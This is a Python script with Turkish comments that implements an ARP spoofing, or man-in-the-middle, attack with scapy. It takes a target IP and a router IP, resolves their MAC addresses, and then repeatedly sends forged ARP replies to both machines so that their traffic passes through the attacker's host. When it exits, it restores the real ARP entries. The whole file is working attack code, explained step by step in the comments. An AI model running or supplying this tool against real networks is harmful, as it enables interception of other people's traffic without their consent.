import scapy.all as scapy #Scapy ag taramasi, agda broadcast vs. gibi islemleri yapmamiza olanak saglar
import time #Zaman atamak bir kod satirini geciktirmek icin kullanilir
import optparse

def User_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--ipt",dest="target_ip",help="Hedef bilgisayarin ip adresini giriniz")
    parse_object.add_option("-r", "--ipr", dest="rooter_ip",help="Rooter'in ip adresini giriniz")
    user_input = parse_object.parse_args()[0]#parse_args bir options ve bir arguments degeri verir bu degerlerden sadece options degerini almak icin [0] yapilir
    if not user_input.target_ip:
        print("Target IP adresi girilmedi!!")
    if not user_input.rooter_ip:
        print("Rooter IP adresi girilmedi!!")
    return user_input

#Bu fonksiyon kullanicinin girdigi IP adresine gore o IP adresinin MAC degerini verir
def Get_MAC_Address(user_ipaddress):
    arp_request_packet = scapy.ARP(pdst=user_ipaddress) #ARP paketini olusturmak icin kullanilir. Girilen ip degerini alir
    broadcast_packed = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Broadcast yapacagi yer default olarak dst icinde belirlenmistir
    paket_birlestir = broadcast_packed / arp_request_packet # Gelen 2 paketi karsilastirip birlestirir tek paket haline getirir
                                                            #(Taradigi IP adreslerini Broadcast yapacagi yer ile birlestirir)
    cevap_gelen = scapy.srp(paket_birlestir,timeout=1,verbose = False)[0] #verbose = False komutu gereksiz bilgileri yazdirma anlamina gelir
    #Broadcast'lerden cevap gelenleri dondurur cevap gelmeyenler icin timeout 1 atar ve sonrakine gecer
    #[0] yapilmasinin sebebi yapilan broadcast sonrasinda cevap verilenler ve de cevap verilemeyenler goruntulenir.
    #Kullanici tek bir ip adresinin mac degerini ogrenmek istediginden sadece cevap verilenleri almak icin [0] girilir.
    #Sonucta bu deger bir tuple degerdir ve [0] olarak ilk indisindeki deger(cevap verilenler) alinabilir.

    return cevap_gelen[0][1].hwsrc #hwsrc = cevap_gelen broadcast degerinden mac adresini almak icin kullanilir
                                   #cevap_gelen broadcast degeri cok fazla veri tuttugu icin indis degerlerini girerek hwsrc kismina (yani mac adresine) erisim saglanir

#op = 1 olsaydi istek alirdi op = 2 olunca cevap alir.
#op = 1 olunca Target Rooter'a istekler gonderir. op = 2 olunca Target Rooter'dan bu isteklerin cevaplarini alir.
#pdst = hedef bilgisayarin ip adresi
#hwdst = hedef bilgisayarin mac adresi
#psrc = kali'nin ip adresi. Bu degeri bir rooter gibi gostermek icin degistirdik
def arp_poisoning(hedef_ip,zehirlenen_ip):
    target_mac = Get_MAC_Address(hedef_ip)#hedef mac adresi degerini alir
    arp_cevap = scapy.ARP(op=2, pdst=hedef_ip, hwdst=target_mac, psrc=zehirlenen_ip)
    scapy.send(arp_cevap,verbose = False)  #Olusturdugumuz paketi yollamamizi saglar

def sifirlama_islemi(target_ip,poisoned_ip):
    target_mac = Get_MAC_Address(target_ip)
    gateway_mac = Get_MAC_Address(poisoned_ip)
    arp_cevap = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip,hwsrc = gateway_mac) #Sistem kapatilirken gercek mac degerlerine esitleme yapilir
    scapy.send(arp_cevap,verbose = False,count = 6)  #Olusturdugumuz paketi yollamamizi saglar

user_input_enter = User_input()
user_target_ip = user_input_enter.target_ip
user_rooter_ip = user_input_enter.rooter_ip

packet = 0
try:
    while True: #While dongusunun sebebi eger while olmazsa bu islemi yapinca sadece 1 paket gonderir ve islem sonlanir. Mac adresleri esitlenir fakar bir sure sonra tekrardan eski haline doner.
        #Bu sebep ile araliklarla paket gondermeye devam edersek herhangi bir sistem sifirlamasi olmaz
        arp_poisoning(user_target_ip,user_rooter_ip) #Ilk olarak target pc kandirilir. Kullanici kendisini rooter gibi gosterir
        arp_poisoning(user_rooter_ip,user_target_ip) #Sonrasinda Rooter kandirilir. Kullanici kendisini o rooter'in kullanicisi olarak gosterir
        packet += 2
        print("\rPaketler gonderiliyor " + str(packet),end="") #Bu komut while dongusu icerisinde sadece 1 kez yazdirilir packet degiskeni ile kac paket gonderilmis ise afktif olarak gosterilir(Sadece python3 ile calisir)
        time.sleep(3) #Donguye girmeden once 3 saniye kadar bekler sonra donguye girer.
                      #Surekli olarak donguye girmesi saniyede binlerce paket gondermesini saglar bu durum bazi olumsuzluklara yol acabilir
except KeyboardInterrupt:
    print("\nCikis yapiliyor..\nSifirlama islemi gerceklestiriliyor")
    sifirlama_islemi(user_target_ip,user_rooter_ip)
    sifirlama_islemi(user_rooter_ip,user_target_ip)